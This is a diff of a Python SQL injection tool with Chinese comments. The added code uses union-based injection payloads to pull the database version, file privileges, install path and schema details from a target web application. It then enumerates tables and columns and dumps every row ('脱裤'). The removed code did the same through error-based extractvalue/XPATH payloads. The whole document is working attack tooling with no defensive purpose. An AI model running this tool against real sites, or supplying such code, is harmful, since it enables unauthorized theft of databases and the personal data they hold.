@@ -8,7 +8,7 @@ import pprint
 from myhttp import HTTP
 
 """-----定义分隔符-----"""
-Global_spilt = "'!@Aa@!'"
+Global_spilt = "!@Aa@!"
 """-----定义分隔符-----"""
 pp = pprint.PrettyPrinter()
 
@@ -32,11 +32,134 @@ class InjUnion(HTTP):
             return False
 
         # 脱裤_数据库版本
-        url = self._url % 'concat({0},@@VERSION,{0},database(),char(126))' \
-            .format(Global_spilt)
-        self.GET_RE(url, '', self._lock)
+        if data := self.GET_RE(
+                self._url,
+                'concat(\'{0}\',@@VERSION,char(126))'.format(Global_spilt),
+                '{0}(.*?)~'.format(Global_spilt)):
+            self._db['系统数据库版本'] = data
 
+        # 脱裤_数据库文件权限
+        if data := self.GET_RE(
+                self._url,
+                'concat(\'{0}\',@@secure_file_priv,char(126))'.format(Global_spilt),
+                '{0}(.*?)~'.format(Global_spilt)):
+            self._db['系统数据库文件权限'] = data
+
+        # 脱裤_数据库安装路径
+        if data := self.GET_RE(
+                self._url,
+                'concat(\'{0}\',@@basedir,char(126))'.format(Global_spilt),
+                '{0}(.*?)~'.format(Global_spilt)):
+            self._db['系统数据库安装路径'] = data
+
+        # 脱裤_系统数据库db总数
+        if data := self.GET_RE(
+                self._url,
+                'concat(\'{0}\',({1}),char(126))'.format(
+                    Global_spilt,
+                    'SELECT COUNT(*) FROM information_schema.schemata'),
+                '{0}(.*?)~'.format(Global_spilt)):
+            self._db['系统数据库db总数'] = data
+
+        # 脱裤_系统数据库tb总数
+        if data := self.GET_RE(
+                self._url,
+                'concat(\'{0}\',({1}),char(126))'.format(
+                    Global_spilt,
+                    'SELECT COUNT(*) FROM information_schema.TABLES'),
+                '{0}(.*?)~'.format(Global_spilt)):
+            self._db['系统数据库tb总数'] = data
+
+        # 脱裤_本数据库db名
+        if data := self.GET_RE(
+                self._url,
+                'concat(\'{0}\',({1}),char(126))'.format(
+                    Global_spilt,
+                    'SELECT DATABASE()'),
+                '{0}(.*?)~'.format(Global_spilt)):
+            self._db['本数据库db名'] = data
+
+        # 脱裤_本数据库tb数
+        if data := self.GET_RE(
+                self._url,
+                'concat(\'{0}\',({1}),char(126))'.format(
+                    Global_spilt,
+                    'SELECT count(*) FROM information_schema.STATISTICS '
+                    'WHERE TABLE_SCHEMA=database()'),
+                '{0}(.*?)~'.format(Global_spilt)):
+            self._db['本数据库tb数'] = data
+
+        # 脱裤_本数据库tb名
+        if data := self.GET_RE(
+                self._url,
+                'concat(\'{0}\',({1}),char(126))'.format(
+                    Global_spilt,
+                    'SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.STATISTICS '
+                    'WHERE TABLE_SCHEMA=database()'),
+                '{0}(.*?)~'.format(Global_spilt)):
+            self._db['本数据库tb名'] = data
+
+        if len(self._db) > 0:
+            return self._db_table()
         return False
+        pass
+
+    def _db_table(self) -> bool:
+        """
+        函数：脱裤->数据库
+
+        :return: T/F=成功脱裤
+        """
+
+        for tb_name in self._db['本数据库tb名'].split(','):
+            print('脱裤->', tb_name)
+            columns, row_max = '', 0
+
+            # 脱裤_列名
+            if data := self.GET_RE(
+                    self._url,
+                    'concat(\'{0}\',({1}),char(126))'.format(
+                        Global_spilt,
+                        'SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS '
+                        f'WHERE TABLE_NAME = \'{tb_name}\' and TABLE_SCHEMA=database()'),
+                    '{0}(.*?)~'.format(Global_spilt)):
+                columns = data.split(',')
+                self._tbs[tb_name] = [['行'] + columns]
+
+            # 脱裤_行数
+            if data := self.GET_RE(
+                    self._url,
+                    'concat(\'{0}\',({1}),char(126))'.format(
+                        Global_spilt,
+                        'SELECT COUNT(*) FROM ' + tb_name),
+                    '{0}(.*?)~'.format(Global_spilt)):
+                row_max = data
+                for i in range(row_max):
+                    self._tbs[tb_name].append([i + 1])
+                pass
+
+            # 得到行数之后，按列脱
+            for column in columns:
+                if row_max == 0:
+                    break
+                print(f'\t{row_max=},{column}')
+
+                if data := self.GET_RE(
+                        self._url,
+                        'concat(\'{0}\',({1}),char(126))'.format(
+                            Global_spilt,
+                            f'SELECT GROUP_CONCAT({column}) FROM {tb_name}'),
+                        '{0}(.*?)~'.format(Global_spilt)):
+                    data = data.split(',')
+                    # print(f'\t{data=}')
+
+                    # 循环将文件存到字典中
+                    for i in range(row_max):
+                        self._tbs[tb_name][i + 1].append(data[i])
+                    pass
+                pass
+
+        return True
         pass
 
     def __init__(self, Lock, Name: str, Info: dict):
@@ -49,182 +172,15 @@ class InjUnion(HTTP):
         """
         if '脱裤' in Info:
             return
-        Info['脱裤'] = {'数据库': {}}
-        self._db = {'数据库': {}}
+        Info['注入方式']['EXP'] = '基于联合注入'
+        Info['脱裤'] = {'数据库': {}, '数据表': {}}
 
         self._lock = Lock
         self._threadname = Name
         self._url = Info['注入方式']['基于联合注入']
-        self._db = Info['脱裤']
+        self._db = Info['脱裤']['数据库']
+        self._tbs = Info['脱裤']['数据表']
         self._db_init()
         pass
 
-    pass
-
-
-def GetResult_ERROR_COLUMN(Url, Table, Column, Str_sp='!@a@!0'):
-    """
-    函数：分段获取数据库信息
-
-    :param Url: 注入点URL
-    :param Table: 脱裤表名
-    :param Column: 脱裤列名
-    :param Str_sp: 用于分割爆破的字符串，默认为'!@a@!0'
-    :return: 拼接的字符串
-    """
-
-    # 构造注入语句
-    url0 = f"{Url} and extractvalue(0,concat('~',substr((%s),%d),'~'))--+"
-    sql_code = f'SELECT GROUP_CONCAT({Column} SEPARATOR \'{Str_sp}\')as DT FROM {Table}'
-    ret_str = ''
-
-    # 构造返回值的长度
-    ret_max = GetResult_ERROR(Url, f'SELECT LENGTH(DT) FROM({sql_code})A')
-
-    i = 1
-    while len(ret_str) < ret_max:
-        # 格式化注入url
-        url = url0 % (sql_code, i)
-
-        # 注入，并得到返回长度
-        content = requests.get(url=url)  # , headers=Global_Headers)
-        body_len = int(content.headers['Content-Length']) \
-            if 'Content-Length' in content.headers \
-            else int(len(content.content))
-        print("\t【网页", content.status_code, body_len, f'\t【{url}】')
-        # print(content.text.replace('\r\n', ''),
-        #       end='\n】原文结束\n')
-
-        find_list = re.findall("XPATH syntax error: \'~(.*?)\'", content.text)
-        for find_data in find_list:
-            ret_str += find_data
-            i += len(find_data)
-            # print(i, ret_max, find_data, ret_str)
-            if i > ret_max:
-                return ret_str[:-1].split(Str_sp)
-    return None
-    pass
-
-
-def GetResult_ERROR_SUB(Url, Sql_code, Left):
-    """
-    函数：分段获取数据库信息
-
-    :param Url: 注入点URL
-    :param Sql_code: 注入点语句
-    :param Left: 拼接的开始点
-    :return: 拼接的字符串后段
-    """
-
-    # 构造注入点
-    url0 = f"{Url} and extractvalue(0,concat('~',substr((%s),%d,%d),'~'))--+"
-    ret_str = ''
-    while True:
-        url = url0 % (Sql_code, Left, 32)
-
-        # 测试链接，并得到返回长度
-        content = requests.get(url=url)  # , headers=Global_Headers)
-        body_len = int(content.headers['Content-Length']) \
-            if 'Content-Length' in content.headers \
-            else int(len(content.content))
-        print("\t【网页", content.status_code, body_len, f'\t【{url}】')
-        print(content.text.replace('\r\n', ''),
-              end='\n】原文结束\n')
-        if body_len == 0:
-            break
-        find_list = re.findall("XPATH syntax error: \'~(.*?)\'", content.text)
-        print(">>re>>", find_list)
-        for index, x in enumerate(find_list):
-            if x[-1] == '~':  # 有闭合
-                ret_str += x[:-1]
-                return ret_str
-            else:  # 无闭合，说明该字段被截断
-                ret_str += x
-                Left += len(ret_str)
-    return None
-
-
-def GetResult_ERROR(Url, Sql_code):
-    """
-    :param Url: 处理的payload注入点
-    :param Sql_code: 处理的SQL语句
-    :return: 返回查询结果
-    """
-    url = f"{Url} and extractvalue(0,concat('~',({Sql_code}),'~'))--+"
-    # 测试链接，并得到返回长度
-    content = requests.get(url=url)  # , headers=Global_Headers)
-    body_len = int(content.headers['Content-Length']) \
-        if 'Content-Length' in content.headers \
-        else int(len(content.content))
-    # print("\t【网页", content.status_code, body_len, f'\t【{url}】')
-    # print(content.text.replace('\r\n', ''),
-    #       end='\n】原文结束\n\n')
-    if body_len == 0:
-        return None
-    find_list = re.findall("XPATH syntax error: \'~(.*?)\'", content.text)
-    for index, x in enumerate(find_list):
-        if x[-1] == '~':  # 有闭合
-            x = x[:-1]
-        else:  # 无闭合，说明该字段被截断
-            print('>>>第一次读取结果', x)
-            # x2 = GetResult_ERROR_SUB(Url, Sql_code, len(x))
-            return x[:-1] + GetResult_ERROR_SUB(Url, Sql_code, len(x))
-        return int(x) if x.isdigit() else x
-    return None
-    pass
-
-
-def SelectTables(Url, Database, Tables, Dict_Save):
-    """
-    函数：爆破数据库
-
-    :param Url: 提供的注入点
-    :param Database: 提供的数据库名
-    :param Tables: 提供的表名
-    :param Dict_Save: 提供的字典
-    :return: T/F
-    """
-
-    # 开始脱裤，循环表格名
-    for tb_name in Tables.split(','):
-        print('>>表名\t' + tb_name)
-        Dict_Save[tb_name] = {}
-
-        # 01 查询 表格列名
-        columns = GetResult_ERROR(
-            Url, 'SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS '
-                 f'WHERE TABLE_NAME = \'{tb_name}\' and TABLE_SCHEMA = DATABASE()'
-        ).split(',')
-        print(f'>>>>{tb_name:}\t{columns}')
-
-        # 02 查询该表行数，并初始化二维列表
-        row_max = GetResult_ERROR(
-            Url, f'SELECT COUNT(*) FROM {tb_name}')
-        Dict_Save[tb_name]['row_len'] = row_max
-        Dict_Save[tb_name]['data'] = [['行'] + columns]
-
-        # 如果表行数为0 则下一次循环
-        if row_max is None or row_max <= 0:
-            continue
-        lv_data = Dict_Save[tb_name]['data']
-        for i in range(row_max):
-            lv_data.append([i + 1])
-
-        # 03 查询该列的所有内容
-        for column_name in columns:
-            tb_datas = GetResult_ERROR_COLUMN(
-                Url, tb_name, column_name)
-
-            # 04 如果返回空，则下一次循环
-            if tb_datas is None:
-                continue
-
-            # 05 将值插入表
-            for i in range(row_max):
-                data = tb_datas[i]
-                if data.isdigit():
-                    data = int(data)
-                lv_data[i + 1].append(data)
-        # pp.pprint(Dict_Save)
-    return len(Dict_Save) != 0
     pass
